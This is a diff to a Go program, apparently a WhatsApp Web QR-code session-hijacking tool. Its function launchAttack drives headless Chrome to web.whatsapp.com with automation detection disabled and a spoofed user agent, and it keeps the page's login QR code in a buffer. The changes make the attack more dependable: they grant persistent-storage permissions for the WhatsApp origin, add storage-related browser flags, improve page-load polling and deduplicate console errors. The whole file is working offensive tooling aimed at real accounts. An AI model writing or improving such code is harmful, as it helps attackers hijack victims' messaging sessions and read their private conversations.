@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/chromedp/chromedp"
+	"github.com/chromedp/cdproto/browser"
 	"github.com/chromedp/cdproto/runtime"
 	"programa/utils"
 )
@@ -218,19 +219,28 @@ func launchAttack(cfg attackCfg) {
 	tabCtx, tabCancel := chromedp.NewContext(allocCtx)
 	defer tabCancel()
 
+	var loggedErrors sync.Map
 	chromedp.ListenTarget(tabCtx, func(ev interface{}) {
 		switch e := ev.(type) {
 		case *runtime.EventConsoleAPICalled:
 			if e.Type == "error" || e.Type == "warning" {
+				text := fmt.Sprintf("%v", e.Args)
+				if _, loaded := loggedErrors.LoadOrStore(text, true); loaded {
+					return
+				}
 				var args []string
 				for _, a := range e.Args {
 					args = append(args, fmt.Sprintf("%v", a))
 				}
-				fmt.Printf("\n%s[CONSOLE-%s] %s%s\n", utils.Red, e.Type, strings.Join(args, " "), utils.Reset)
+				fmt.Printf("\n%s[CONSOLE-%s] %s%s\n", utils.Yellow, e.Type, strings.Join(args, " "), utils.Reset)
 			}
 		case *runtime.EventExceptionThrown:
 			if e.ExceptionDetails != nil {
-				fmt.Printf("\n%s[EXCEPTION] %s%s\n", utils.Red, e.ExceptionDetails.Error(), utils.Reset)
+				text := e.ExceptionDetails.Error()
+				if _, loaded := loggedErrors.LoadOrStore(text, true); loaded {
+					return
+				}
+				fmt.Printf("\n%s[EXCEPTION] %s%s\n", utils.Red, text, utils.Reset)
 			}
 		}
 	})
@@ -242,22 +252,19 @@ func launchAttack(cfg attackCfg) {
 	}
 	fmt.Printf("%s[+] Loading web.whatsapp.com...%s\n", utils.Green, utils.Reset)
 
-	var pageReady bool
-	for i := 0; i < 30; i++ {
-		err := chromedp.Run(tabCtx, chromedp.Evaluate(`document.readyState`, &pageReady))
-		if err == nil && pageReady {
+	chromedp.Run(tabCtx, browser.SetPermission(&browser.PermissionDescriptor{Name: "persistent-storage"}, browser.PermissionSettingGranted).WithOrigin("https://web.whatsapp.com"))
+	chromedp.Run(tabCtx, browser.SetPermission(&browser.PermissionDescriptor{Name: "durable-storage"}, browser.PermissionSettingGranted).WithOrigin("https://web.whatsapp.com"))
+
+	var ready string
+	for i := 0; i < 60; i++ {
+		chromedp.Run(tabCtx, chromedp.Evaluate(`document.readyState`, &ready))
+		if ready == "complete" {
 			break
 		}
-		time.Sleep(1 * time.Second)
+		time.Sleep(500 * time.Millisecond)
 	}
 
-	var debugScreenshot []byte
-	chromedp.Run(tabCtx, chromedp.FullScreenshot(&debugScreenshot, 90))
-	if len(debugScreenshot) > 0 {
-		os.MkdirAll(wwwDir, 0755)
-		os.WriteFile(filepath.Join(wwwDir, "debug_whatsapp.png"), debugScreenshot, 0644)
-		fmt.Printf("%s[+] Debug screenshot saved to %s/debug_whatsapp.png%s\n", utils.Green, wwwDir, utils.Reset)
-	}
+	fmt.Printf("%s[+] Page loaded (readyState=%s)%s\n", utils.Green, ready, utils.Reset)
 
 	var currentQR []byte
 	var qrMu sync.Mutex
@@ -429,11 +436,14 @@ func findChrome() string {
 func startChrome(binary, userDir string) (context.Context, context.CancelFunc, error) {
 	opts := append(chromedp.DefaultExecAllocatorOptions[:],
 		chromedp.Flag("headless", "new"),
-		chromedp.Flag("disable-blink-features", "AutomationControlled"),
+		chromedp.Flag("disable-blink-features", "AutomationControlled,StorageBuckets"),
 		chromedp.Flag("disable-background-timer-throttling", true),
 		chromedp.Flag("disable-renderer-backgrounding", true),
 		chromedp.Flag("disable-background-networking", false),
+		chromedp.Flag("disable-features", "StorageBuckets"),
 		chromedp.Flag("enable-automation", false),
+		chromedp.Flag("unlimited-storage", true),
+		chromedp.Flag("disable-storage-reset", true),
 		chromedp.Flag("lang", "en"),
 		chromedp.WindowSize(1920, 1080),
 		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
